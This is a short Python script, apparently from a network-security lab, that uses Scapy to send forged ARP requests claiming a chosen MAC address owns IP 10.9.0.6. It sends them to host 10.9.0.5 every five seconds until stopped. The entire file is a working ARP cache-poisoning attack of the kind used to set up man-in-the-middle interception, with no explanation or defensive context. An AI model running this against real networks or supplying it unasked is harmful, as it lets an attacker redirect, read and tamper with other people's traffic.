#!/usr/bin/env python3
from scapy.all import *

E = Ether(dst="ff:ff:ff:ff:ff:ff", src="02:42:89:1f:ff:70")
A = ARP(op=1, hwsrc="02:42:89:1f:ff:70", psrc="10.9.0.6",
        hwdst="00:00:00:00:00:00", pdst="10.9.0.5")

pkt = E/A

print("Sending packet every 5 seconds... (Press Ctrl+C to stop)")

# inter=5 waits 5 seconds between packets
# loop=1 keeps sending until you kill the script
sendp(pkt, iface="br-f55ccea4134c", inter=5, loop=1)